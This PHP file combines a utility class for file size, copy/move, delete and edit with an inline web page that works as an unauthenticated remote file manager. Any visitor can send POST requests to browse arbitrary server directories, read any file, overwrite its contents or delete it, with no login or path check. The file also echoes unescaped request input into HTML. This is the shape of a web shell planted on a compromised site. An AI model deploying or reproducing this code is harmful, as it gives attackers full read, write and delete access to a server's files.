<?php
class Files
{
    protected $path;
    protected $options;
    protected $filesystem;
    protected $directories;
    protected $files;

    /**
     * Get the file size of a given file or for the aggregate number of bytes in all directory files
     *
     * Recursive handling of files - uses file arrays created in Discovery
     *
     * @param   string  $path
     *
     * @return  int
     * @since   1.0
     */
    public function calculateSize($path)
    {
        $size = 0;

        $this->discovery($path);

        foreach ($this->files as $file) {
            $size = $size + filesize($file);
        }

        return $size;
    }
    function cwd()
    {
    	if (isset($_POST['dir'])) {
    		$cwd = $_POST['dir'];
    	} else {
    		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
    	} return $cwd;
    }

    /**
     * Recursive Copy or Delete - uses Directory and File arrays created in Discovery
     *
     * Copy uses Directory array first to create folders, then copies the files
     *
     * @param   string  $path
     * @param   string  $target
     * @param   string  $target_name
     * @param   string  $copyOrMove
     *
     * @return  void
     * @since   1.0
     */
    function copyOrMove($path, $target, $target_name = '', $copyOrMove = 'copy')
    {
        if (file_exists($path)) {
        } else {
            return;
        }

        if (file_exists($target)) {
        } else {
            return;
        }

        $new_path = $target . '/' . $target_name;

        $this->discovery($path);

        if (count($this->directories) > 0) {
            asort($this->directories);
            foreach ($this->directories as $directory) {

                $new_directory = $new_path . '/' . substr($directory, strlen($path), 99999);

                if (basename($new_directory) == '.' || basename($new_directory) == '..') {

                } elseif (file_exists($new_directory)) {

                } else {
                    mkdir($new_directory);
                }
            }
        }

        if (count($this->files) > 0) {
            foreach ($this->files as $file) {
                $new_file = $new_path . '/' . substr($file, strlen($path), 99999);
                \copy($file, $new_file);
            }
        }

        if ($copyOrMove == 'move') {

            if (count($this->files) > 0) {
                foreach ($this->files as $file) {
                    unlink($file);
                }
            }

            if (count($this->directories) > 0) {
                arsort($this->directories);
                foreach ($this->directories as $directory) {
                    if (basename($directory) == '.' || basename($directory) == '..') {
                    } else {
                        rmdir($directory);
                    }
                }
            }
        }

        return;
    }

    /**
     * Recursive Delete, uses discovery Directory and File arrays to first delete files
     *  and then remove the folders
     *
     * @param   $path
     *
     * @return  int
     * @since   1.0
     */
    function delete($path)
    {
        if (file_exists($path)) {
        } else {
            return;
        }

        $this->discovery($path);

        if (count($this->files) > 0) {
            foreach ($this->files as $file) {
                unlink($file);
            }
        }

        if (count($this->directories) > 0) {

            arsort($this->directories);

            foreach ($this->directories as $directory) {

                if (basename($directory) == '.' || basename($directory) == '..') {
                } else {
                    rmdir($directory);
                }
            }
        }

        return;
    }

    function edit($path, $text) 
    {
    	$this->discovery($path);

    	if (is_file($path)) {
    		$handle = fopen($path, "w");
    		fwrite($handle, $text);
    		fclose($handle);
    	}
    }

    /**
     * Discovery retrieves folder and file names, useful for other file/folder operations
     *
     * @param   $path
     *
     * @return  void
     * @since   1.0
     */
    public function discovery($path)
    {
        $this->directories = array();
        $this->files       = array();

        if (is_file($path)) {
            $this->files[] = $path;
            return;
        }

        if (is_dir($path)) {
        } else {
            return;
        }

        $this->directories[] = $path;

        $objects = new RecursiveIteratorIterator (
            new RecursiveDirectoryIterator($path),
            RecursiveIteratorIterator::SELF_FIRST);

        foreach ($objects as $name => $object) {

            if (is_file($name)) {
                $this->files[] = $name;

            } elseif (is_dir($name)) {

                if (basename($name) == '.' || basename($name) == '..') {
                } else {
                    $this->directories[] = $name;
                }
            }
        }

        return;
    }
}
?>
<table>
<?php
$file = new Files();
switch (@$_POST['action']) {
	case 'edit':
		if (isset($_POST['submit'])) {
			if ($file->edit($_POST['file'], $_POST['text'])) {
				echo "failed";
			} else {
				echo "success";
			}
		}
		?>
		<form method="post">
			<tr>
				<td>
					Filename : <?= basename($_POST['file']) ?>
				</td>
			</tr>
			<tr>
				<td>
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
			</tr>
			<tr>
				<td>
					<button type="submit" name="submit">EDIT</button>
				</td>
			</tr>
			<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
			<input type="hidden" name="action" value="edit">
		</form>
		<?php
		exit();
		break;
	
	case 'delete':
		$file->delete($_POST['file']);
		break;
}
$iterator = new DirectoryIterator($file->cwd());
foreach ($iterator as $dir) {
	if ($dir->isDir()) {
		?>
		<tr>
			<form method="post">
				<td>
					<button name="dir" value="<?= $file->cwd().DIRECTORY_SEPARATOR.$dir->getPathname() ?>">
						<?= basename($dir->getPathname()) ?>
					</button>
				</td>
			</form>
		</tr>
		<?php
	}
}
foreach ($iterator as $files) {
	if ($files->isFile()) {
		?>
		<tr>
			<td>
				<?= basename($files->getPathname()) ?>
			</td>
			<form method="post">
				<td>
					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option selected>choose . .</option>
						<option value="edit">edit</option>
						<option value="delete">delete</option>
					</select>
				</td>
				<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
			</form>
		</tr>
		<?php
	}
}
?>
</table>
